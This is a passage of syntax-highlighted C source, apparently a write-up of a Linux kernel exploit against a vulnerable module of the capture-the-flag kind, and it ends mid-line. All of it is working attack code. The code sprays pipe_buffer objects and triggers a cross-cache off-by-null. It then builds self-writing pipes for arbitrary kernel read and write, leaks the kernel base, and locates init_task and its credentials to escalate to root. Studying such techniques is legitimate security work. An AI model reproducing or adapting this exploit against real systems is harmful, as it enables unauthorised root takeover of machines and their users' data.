&lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to alloc %d pipe!&quot;</span>, i);</span><br><span class="line">                errExit(<span class="string">&quot;FAILED to create pipe!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] exetend pipe_buffer...&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; (PIPE_SPRAY_NUM / <span class="number">2</span>); i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (i % <span class="number">8</span> == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                free_page(pgv_8pages_start_idx++);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (fcntl(pipe_fd[<span class="number">0</span> + i][<span class="number">1</span>], F_SETPIPE_SZ, <span class="number">0x1000</span> * <span class="number">64</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to extend %d pipe!\n&quot;</span>, <span class="number">0</span> + i);</span><br><span class="line">                errExit(<span class="string">&quot;FAILED to extend pipe!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] spray vulnerable 2k obj...&quot;</span>);</span><br><span class="line">        free_page(pgv_8pages_start_idx++);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            create(i, <span class="number">8</span>, <span class="string">&quot;0x196082&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] exetend pipe_buffer...&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; (PIPE_SPRAY_NUM / <span class="number">2</span>); i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (i % <span class="number">8</span> == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                free_page(pgv_8pages_start_idx++);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (fcntl(pipe_fd[(PIPE_SPRAY_NUM / <span class="number">2</span>) + i][<span class="number">1</span>], F_SETPIPE_SZ, <span class="number">0x1000</span> * <span class="number">64</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to extend %d pipe!\n&quot;</span>, (PIPE_SPRAY_NUM / <span class="number">2</span>) + i);</span><br><span class="line">                errExit(<span class="string">&quot;FAILED to extend pipe!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] allocating pipe pages...&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;0x196082&quot;</span>, <span class="number">8</span>);</span><br><span class="line">            write(pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">            write(pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">            write(pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">            write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;0x196082&quot;</span>, <span class="number">8</span>);</span><br><span class="line">            write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;0x196082&quot;</span>, <span class="number">8</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] trigerring cross-cache off-by-null...&quot;</span>);</span><br><span class="line">        show(<span class="number">0</span>, <span class="number">0</span>, buf);</span><br><span class="line">        <span class="built_in">memset</span>(buf, <span class="number">0x61</span>, <span class="number">0x800</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            edit(i, <span class="number">0x7f8</span>, buf);</span><br><span class="line">        &#125;</span><br><span class="line">        show(<span class="number">0</span>, <span class="number">0</span>, buf);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] checking for corruption...&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> str_flag[<span class="number">0x10</span>];</span><br><span class="line">            <span class="keyword">int</span> nr;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">memset</span>(str_flag, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span>(str_flag));</span><br><span class="line">            read(pipe_fd[i][<span class="number">0</span>], str_flag, <span class="number">8</span>);</span><br><span class="line">            read(pipe_fd[i][<span class="number">0</span>], &amp;nr, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(str_flag, <span class="string">&quot;0x196082&quot;</span>) &amp;&amp; nr != i)</span><br><span class="line">            &#123;</span><br><span class="line">                orig_pid = nr;</span><br><span class="line">                victim_pid = i;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found victim: \033[0m%d &quot;</span></span><br><span class="line">                       <span class="string">&quot;\033[32m\033[1m, orig: \033[0m%d\n\n&quot;</span>,</span><br><span class="line">                       victim_pid, orig_pid);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (victim_pid == <span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;FAILED to corrupt pipe_buffer!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> snd_orig_pid = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span> snd_vicitm_pid = <span class="number">-1</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> <span class="title">info_pipe_buf</span>;</span></span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">size_t</span> snd_pipe_sz = <span class="number">0x1000</span> * (SND_PIPE_BUF_SZ / <span class="keyword">sizeof</span>(struct pipe_buffer));</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memset</span>(buf, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">        write(pipe_fd[victim_pid][<span class="number">1</span>], buf, SND_PIPE_BUF_SZ * <span class="number">2</span> - <span class="number">24</span> - <span class="number">3</span> * <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] free original pipe...&quot;</span>);</span><br><span class="line">        close(pipe_fd[orig_pid][<span class="number">0</span>]);</span><br><span class="line">        close(pipe_fd[orig_pid][<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] fcntl() to set the pipe_buffer on victim page...&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (i == orig_pid || i == victim_pid)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (fcntl(pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, snd_pipe_sz) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to resize %d pipe!\n&quot;</span>, i);</span><br><span class="line">                errExit(<span class="string">&quot;FAILED to re-alloc pipe_buffer!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        read(pipe_fd[victim_pid][<span class="number">0</span>], buf, SND_PIPE_BUF_SZ - <span class="number">8</span> - <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">        read(pipe_fd[victim_pid][<span class="number">0</span>], &amp;info_pipe_buf, <span class="keyword">sizeof</span>(info_pipe_buf));</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[?] info_pipe_buf-&gt;page: \033[0m%p\n&quot;</span></span><br><span class="line">               <span class="string">&quot;\033[34m\033[1m[?] info_pipe_buf-&gt;ops: \033[0m%p\n&quot;</span>,</span><br><span class="line">               info_pipe_buf.page, info_pipe_buf.ops);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">size_t</span>)info_pipe_buf.page &lt; <span class="number">0xffff000000000000</span> || (<span class="keyword">size_t</span>)info_pipe_buf.ops &lt; <span class="number">0xffffffff81000000</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;FAILED to re-hit victim page!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Successfully to hit the UAF page!\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Got page leak:\033[0m %p\n&quot;</span>, info_pipe_buf.page);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] construct a second-level uaf pipe page...&quot;</span>);</span><br><span class="line">        info_pipe_buf.page = (struct page *)((<span class="keyword">size_t</span>)info_pipe_buf.page + <span class="number">0x40</span>);</span><br><span class="line">        write(pipe_fd[victim_pid][<span class="number">1</span>], &amp;info_pipe_buf, <span class="keyword">sizeof</span>(info_pipe_buf));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> nr;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (i == orig_pid || i == victim_pid)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            read(pipe_fd[i][<span class="number">0</span>], &amp;nr, <span class="keyword">sizeof</span>(nr));</span><br><span class="line">            <span class="keyword">if</span> (nr &lt; PIPE_SPRAY_NUM &amp;&amp; i != nr)</span><br><span class="line">            &#123;</span><br><span class="line">                snd_orig_pid = nr;</span><br><span class="line">                snd_vicitm_pid = i;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found second-level victim: \033[0m%d &quot;</span></span><br><span class="line">                       <span class="string">&quot;\033[32m\033[1m, orig: \033[0m%d\n&quot;</span>,</span><br><span class="line">                       snd_vicitm_pid, snd_orig_pid);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (snd_vicitm_pid == <span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;FAILED to corrupt second-level pipe_buffer!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">size_t</span> trd_pipe_sz = <span class="number">0x1000</span> * (TRD_PIPE_BUF_SZ / <span class="keyword">sizeof</span>(struct pipe_buffer));</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> <span class="title">evil_pipe_buf</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page_ptr</span>;</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">        write(pipe_fd[snd_vicitm_pid][<span class="number">1</span>], buf, TRD_PIPE_BUF_SZ - <span class="number">24</span> - <span class="number">3</span> * <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] free second-level original pipe...&quot;</span>);</span><br><span class="line">        close(pipe_fd[snd_orig_pid][<span class="number">0</span>]);</span><br><span class="line">        close(pipe_fd[snd_orig_pid][<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] fcntl() to set the pipe_buffer on second-level victim page...&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (i == orig_pid || i == victim_pid || i == snd_orig_pid || i == snd_vicitm_pid)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (fcntl(pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, trd_pipe_sz) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to resize %d pipe!\n&quot;</span>, i);</span><br><span class="line">                errExit(<span class="string">&quot;FAILED to re-alloc pipe_buffer!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] hijacking the 2nd pipe_buffer on page to itself...&quot;</span>);</span><br><span class="line">        evil_pipe_buf.page = info_pipe_buf.page;</span><br><span class="line">        evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;</span><br><span class="line">        evil_pipe_buf.len = TRD_PIPE_BUF_SZ;</span><br><span class="line">        evil_pipe_buf.ops = info_pipe_buf.ops;</span><br><span class="line">        evil_pipe_buf.flags = info_pipe_buf.flags;</span><br><span class="line">        evil_pipe_buf.<span class="keyword">private</span> = info_pipe_buf.<span class="keyword">private</span>;</span><br><span class="line"></span><br><span class="line">        write(pipe_fd[snd_vicitm_pid][<span class="number">1</span>], &amp;evil_pipe_buf, <span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (i == orig_pid || i == victim_pid || i == snd_orig_pid || i == snd_vicitm_pid)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            read(pipe_fd[i][<span class="number">0</span>], &amp;page_ptr, <span class="keyword">sizeof</span>(page_ptr));</span><br><span class="line">            <span class="keyword">if</span> (page_ptr == evil_pipe_buf.page)</span><br><span class="line">            &#123;</span><br><span class="line">                self_2nd_pipe_pid = i;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found self-writing pipe: \033[0m%d\n&quot;</span>,</span><br><span class="line">                       self_2nd_pipe_pid);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (self_2nd_pipe_pid == <span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;FAILED to build a self-writing pipe!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] hijacking the 3rd pipe_buffer on page to itself...&quot;</span>);</span><br><span class="line">        evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;</span><br><span class="line">        evil_pipe_buf.len = TRD_PIPE_BUF_SZ;</span><br><span class="line"></span><br><span class="line">        write(pipe_fd[snd_vicitm_pid][<span class="number">1</span>], buf, TRD_PIPE_BUF_SZ - <span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line">        write(pipe_fd[snd_vicitm_pid][<span class="number">1</span>], &amp;evil_pipe_buf, <span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (i == orig_pid || i == victim_pid || i == snd_orig_pid || i == snd_vicitm_pid || i == self_2nd_pipe_pid)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            read(pipe_fd[i][<span class="number">0</span>], &amp;page_ptr, <span class="keyword">sizeof</span>(page_ptr));</span><br><span class="line">            <span class="keyword">if</span> (page_ptr == evil_pipe_buf.page)</span><br><span class="line">            &#123;</span><br><span class="line">                self_3rd_pipe_pid = i;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found another self-writing pipe:\033[0m&quot;</span></span><br><span class="line">                       <span class="string">&quot;%d\n&quot;</span>,</span><br><span class="line">                       self_3rd_pipe_pid);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (self_3rd_pipe_pid == <span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;FAILED to build a self-writing pipe!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] hijacking the 4th pipe_buffer on page to itself...&quot;</span>);</span><br><span class="line">        evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;</span><br><span class="line">        evil_pipe_buf.len = TRD_PIPE_BUF_SZ;</span><br><span class="line"></span><br><span class="line">        write(pipe_fd[snd_vicitm_pid][<span class="number">1</span>], buf, TRD_PIPE_BUF_SZ - <span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line">        write(pipe_fd[snd_vicitm_pid][<span class="number">1</span>], &amp;evil_pipe_buf, <span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (i == orig_pid || i == victim_pid || i == snd_orig_pid || i == snd_vicitm_pid || i == self_2nd_pipe_pid || i == self_3rd_pipe_pid)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            read(pipe_fd[i][<span class="number">0</span>], &amp;page_ptr, <span class="keyword">sizeof</span>(page_ptr));</span><br><span class="line">            <span class="keyword">if</span> (page_ptr == evil_pipe_buf.page)</span><br><span class="line">            &#123;</span><br><span class="line">                self_4th_pipe_pid = i;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found another self-writing pipe:\033[0m&quot;</span></span><br><span class="line">                       <span class="string">&quot;%d\n&quot;</span>,</span><br><span class="line">                       self_4th_pipe_pid);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (self_4th_pipe_pid == <span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;FAILED to build a self-writing pipe!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] Setting up kernel arbitrary read &amp; write...&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;evil_2nd_buf, &amp;info_pipe_buf, <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;evil_3rd_buf, &amp;info_pipe_buf, <span class="keyword">sizeof</span>(evil_3rd_buf));</span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;evil_4th_buf, &amp;info_pipe_buf, <span class="keyword">sizeof</span>(evil_4th_buf));</span><br><span class="line"></span><br><span class="line">        evil_2nd_buf.offset = <span class="number">0</span>;</span><br><span class="line">        evil_2nd_buf.len = <span class="number">0xff0</span>;</span><br><span class="line"></span><br><span class="line">        evil_3rd_buf.offset = TRD_PIPE_BUF_SZ * <span class="number">3</span>;</span><br><span class="line">        evil_3rd_buf.len = <span class="number">0</span>;</span><br><span class="line">        write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], &amp;evil_3rd_buf, <span class="keyword">sizeof</span>(evil_3rd_buf));</span><br><span class="line"></span><br><span class="line">        evil_4th_buf.offset = TRD_PIPE_BUF_SZ;</span><br><span class="line">        evil_4th_buf.len = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        vmemmap_base = (<span class="keyword">size_t</span>)info_pipe_buf.page &amp; <span class="number">0xfffffffff0000000</span>;</span><br><span class="line">        <span class="keyword">for</span> (;;)</span><br><span class="line">        &#123;</span><br><span class="line">            arbitrary_read_by_pipe((struct page *)(vmemmap_base + <span class="number">157</span> * <span class="number">0x40</span>), buf);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (*(<span class="keyword">uint64_t</span> *)buf &gt; <span class="number">0xffffffff81000000</span> &amp;&amp; ((*(<span class="keyword">uint64_t</span> *)buf &amp; <span class="number">0xfff</span>) == <span class="number">0x070</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                kernel_base = *(<span class="keyword">uint64_t</span> *)buf - <span class="number">0x070</span>;</span><br><span class="line">                kernel_offset = kernel_base - <span class="number">0xffffffff81000000</span>;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found kernel base: \033[0m0x%lx\n&quot;</span></span><br><span class="line">                       <span class="string">&quot;\033[32m\033[1m[+] Kernel offset: \033[0m0x%lx\n&quot;</span>,</span><br><span class="line">                       kernel_base, kernel_offset);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            vmemmap_base -= <span class="number">0x10000000</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] vmemmap_base:\033[0m 0x%lx\n\n&quot;</span>, vmemmap_base);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> parent_task, current_task;</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] Seeking task_struct in memory...&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">uint64_t</span> *comm_addr = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">uint64_t</span> *point_buf = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; <span class="number">1</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            arbitrary_read_by_pipe((struct page *)(vmemmap_base + i * <span class="number">0x40</span>), point_buf);</span><br><span class="line"></span><br><span class="line">            comm_addr = memmem(point_buf, <span class="number">0xf00</span>, target, <span class="number">0xf</span>);</span><br><span class="line">            <span class="keyword">if</span> (comm_addr &amp;&amp; (comm_addr[<span class="number">-2</span>] &gt; <span class="number">0xffff888000000000</span>) &amp;&amp; (comm_addr[<span class="number">-3</span>] &gt; <span class="number">0xffff888000000000</span>) &amp;&amp; (comm_addr[<span class="number">-57</span>] &gt; <span class="number">0xffff888000000000</span>) &amp;&amp; (comm_addr[<span class="number">-56</span>] &gt; <span class="number">0xffff888000000000</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                parent_task = comm_addr[<span class="number">-57</span>];</span><br><span class="line"></span><br><span class="line">                current_task = comm_addr[<span class="number">-50</span>] - <span class="number">2528</span>;</span><br><span class="line"></span><br><span class="line">                page_offset_base = (comm_addr[<span class="number">-50</span>] &amp; <span class="number">0xfffffffffffff000</span>) - i * <span class="number">0x1000</span>;</span><br><span class="line">                page_offset_base &amp;= <span class="number">0xfffffffff0000000</span>;</span><br><span class="line"></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found task_struct on page: \033[0m%p\n&quot;</span>,</span><br><span class="line">                       (struct page *)(vmemmap_base + i * <span class="number">0x40</span>));</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] page_offset_base: \033[0m0x%lx\n&quot;</span>,</span><br><span class="line">                       page_offset_base);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] current task_struct&#x27;s addr: \033[0m&quot;</span></span><br><span class="line">                       <span class="string">&quot;0x%lx\n\n&quot;</span>,</span><br><span class="line">                       current_task);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> command = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> stack_addr;</span><br><span class="line">    <span class="keyword">size_t</span> *tsk_buf;</span><br><span class="line">    <span class="keyword">size_t</span> *mm_struct_buf;</span><br><span class="line">    <span class="keyword">uint64_t</span> mm_struct_addr;</span><br><span class="line">    <span class="keyword">uint64_t</span> mm_struct_page;</span><br><span class="line">    <span class="keyword">uint64_t</span> pgd_addr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (command)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] Seeking for init_task...&quot;</span>);</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">uint64_t</span> init_task;</span><br><span class="line">            <span class="keyword">uint64_t</span> init_cred;</span><br><span class="line">            <span class="keyword">uint64_t</span> init_nsproxy;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (;;)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">size_t</span> ptask_page_addr = direct_map_addr_to_page_addr(parent_task);</span><br><span class="line"></span><br><span class="line">                tsk_buf = (<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span>)buf + (parent_task &amp; <span class="number">0xfff</span>));</span><br><span class="line"></span><br><span class="line">                arbitrary_read_by_pipe((struct page *)ptask_page_addr, buf);</span><br><span class="line">                arbitrary_read_by_pipe((struct page *)(ptask_page_addr + <span class="number">0x40</span>), &amp;buf[<span class="number">512</span> * <span class="number">8</span>]);</span><br><span class="line"></span><br><span class="line">                <span class="comment">/* task_struct::real_parent */</span></span><br><span class="line">                <span class="keyword">if</span> (parent_task == tsk_buf[<span class="number">309</span>])</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                parent_task = tsk_buf[<span class="number">309</span>];</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            init_task = parent_task;</span><br><span class="line">            init_cred = tsk_buf[<span class="number">363</span>];</span><br><span class="line">            init_nsproxy = tsk_buf[<span class="number">377</span>];</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found init_task: \033[0m0x%lx\n&quot;</span>, init_task);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found init_cred: \033[0m0x%lx\n&quot;</span>, init_cred);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found init_nsproxy:\033[0m0x%lx\n&quot;</span>, init_nsproxy);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* now, changing the current task_struct to get the full root :) */</span></span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[*] Escalating ROOT privilege now...&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">size_t</span> current_task_page = direct_map_addr_to_page_addr(current_task);</span><br><span class="line"></span><br><span class="line">            arbitrary_read_by_pipe((struct page 